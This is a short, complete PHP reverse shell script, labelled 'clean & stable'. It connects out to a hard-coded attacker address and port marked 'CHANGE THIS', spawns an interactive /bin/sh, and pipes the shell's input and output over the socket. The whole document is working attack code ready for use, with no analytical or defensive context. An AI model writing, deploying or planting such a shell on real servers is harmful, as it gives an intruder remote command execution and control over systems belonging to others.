<?php
// Simple PHP Reverse Shell - clean & stable
set_time_limit(0);
$ip = '10.50.1.10';     // CHANGE THIS
$port = 4444;        // CHANGE THIS

$sock = fsockopen($ip, $port);
if (!$sock) { die(); }

$proc = proc_open('/bin/sh -i', [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
], $pipes);

while (true) {
    if (feof($sock)) break;
    if (feof($pipes[1])) break;

    $read = [$sock, $pipes[1], $pipes[2]];
    $write = null;
    $except = null;
    if (stream_select($read, $write, $except, 0) === false) break;

    foreach ($read as $r) {
        if ($r === $sock) {
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
        } elseif ($r === $pipes[1] || $r === $pipes[2]) {
            $input = fread($r, 1024);
            fwrite($sock, $input);
        }
    }
}
fclose($sock);
fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
proc_close($proc);
?>
